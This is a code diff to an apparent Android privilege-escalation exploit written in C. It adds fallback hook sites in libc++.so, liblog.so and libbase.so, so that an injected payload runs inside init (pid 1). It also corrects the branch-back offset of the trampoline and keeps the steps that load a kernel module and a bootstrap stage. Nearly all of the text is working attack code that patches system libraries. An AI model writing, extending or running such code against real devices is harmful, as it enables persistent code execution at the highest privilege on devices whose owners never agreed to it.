@@ -434,9 +434,13 @@ static int patch_hook(const char *lib, const char *sym,
     if (first_insn == hook_insn) {
         printf("%s already patched\n", lib); free(buf); return 0;
     }
+    /* The branch back sits right behind the saved first instruction, not at the
+     * end of the padded buffer: libcxx.S now pads itself to 16 bytes after that
+     * pair, so "last four bytes" is no longer where it lives. */
+    uint32_t trailer = (uint32_t)(first_inst_copy - stage_data) + 4;
     uint32_t jmpback = BRANCH |
-        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
-    *(uint32_t *)&buf[stage_len - 4] = jmpback;
+        (((hook_off + 4) - (shell_off + trailer)) >> 2 & 0x3ffffff);
+    *(uint32_t *)&buf[trailer] = jmpback;
     *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
     uint64_t aligned = hook_off & ~(uint64_t)15;
@@ -466,6 +470,56 @@ static int patch_hook(const char *lib, const char *sym,
     int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
     if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
     return ret2;
+}
+
+/* ---- where the payload lives --------------------------------------------
+ *
+ * The branch that enters the payload is PC-relative, so the payload does not
+ * have to stay in libc++.so: any library init both maps and calls can host it,
+ * as long as it has room for the blob. That is the escape hatch for builds
+ * whose libc++.so is packed solid - swapping the host library costs one line
+ * and needs no absolute address, which is why it works where a cross-library
+ * jump would not (the payload's address in pid 1 cannot be known from here).
+ *
+ * Order is by how much the trigger can be trusted. sentry fires on init's first
+ * ostream use; liblog's write fires on every log line init emits, which is what
+ * the orphan process below provokes within a second; libbase's LogMessage sits
+ * in front of liblog on some builds and behind it on others.
+ */
+static const struct hook_site {
+    const char *lib;
+    const char *sym;
+} kHookSites[] = {
+    { "/system/lib64/libc++.so",
+      "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_" },
+    { "/system/lib64/liblog.so", "__android_log_write" },
+    { "/system/lib64/liblog.so", "__android_log_buf_write" },
+    { "/system/lib64/liblog.so", "__android_log_print" },
+    { "/system/lib64/libbase.so",
+      "_ZN7android4base10LogMessageC1EPKcjNS0_11LogSeverityEi" },
+};
+
+static int patch_hook_anywhere(struct PatchRestore *restore) {
+    size_t padded = ((size_t)libcxx_len + 15) & ~(size_t)15;
+
+    for (size_t i = 0; i < sizeof(kHookSites) / sizeof(kHookSites[0]); i++) {
+        uint64_t hook_off, shell_off;
+        uint32_t first_insn;
+
+        /* find_hook_target only reads, so a site that cannot host the payload
+         * costs one scan and nothing else. */
+        if (find_hook_target(kHookSites[i].lib, kHookSites[i].sym,
+                             &hook_off, &shell_off, &first_insn, padded))
+            continue;
+
+        printf("hosting the payload in %s (%s)\n", kHookSites[i].lib, kHookSites[i].sym);
+        if (patch_hook(kHookSites[i].lib, kHookSites[i].sym,
+                       libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                       restore) == 0)
+            return 0;
+        printf("%s did not take the patch, trying the next host\n", kHookSites[i].lib);
+    }
+    return 1;
 }
 
 static int createOrphanProcess(void) {
@@ -555,10 +609,10 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
-                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+    if (patch_hook_anywhere(&g_libcxx_r)) {
+        printf("no library could host the payload\n");
+        goto done;
+    }
 
     rc = 2;
     usleep(500000);
@@ -571,7 +625,7 @@ static int exploit(void) {
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    -1 },
+        { "/dev/df",    "payload: loading custom module",                   -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
